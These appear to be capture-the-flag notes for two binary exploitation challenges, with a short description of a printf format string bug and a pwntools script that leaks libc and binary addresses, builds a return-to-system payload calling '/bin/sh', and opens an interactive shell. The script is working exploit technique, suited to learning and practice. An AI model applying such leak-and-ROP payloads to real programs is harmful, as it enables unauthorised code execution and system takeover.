
ABS
===========================

General overview of problems faced
-------------------------------------
- format string vulnerability in printf takes ab.base as format string, which is the picture_of_adam string
    - if picture_of_adam or any ab.lines[] are format specifiers, attacker controls those for read/write into memory


Script/Command used
------------------
``` python


```


BSL
===========================

General overview of problems faced
-------------------------------------


Script/Command used
------------------
``` python

def yes():
    P.sendlineafter(b'(y/n)\n', b'y')

def exploit():
    yes()
    P.recvuntil(b'current favourite is: ')
    puts = int(P.recvline()[:-1], 16) 
    log.info(f'puts Address: {hex(puts)}')

    LIBC.address = puts - LIBC.symbols['puts']
    log.info(f'LIBC Base @ {hex(LIBC.address)}')

    yes()
    P.sendline(b'0')
    alignment_offset = 8
    small_payload = b'A' * alignment_offset + p64(0) + p64(LIBC.symbols['system']) + p64(0) + p64(next(LIBC.search(b'/bin/sh\00')))
    P.sendline(small_payload)
    yes()
    P.recvuntil(b'Mine is: ')
    get_number = int(P.recvline()[:-1], 16)
    log.info(f'get_number Address: {hex(get_number)}')
    P.sendline(b'4')

    binary_base = get_number - int(0x1221)
    log.info(f"Binary Base @: {hex(binary_base)}")
    
    payload = b'A' * 0xd0
    P.sendline(payload)
    # P.sendline(b'1')

    P.interactive()

```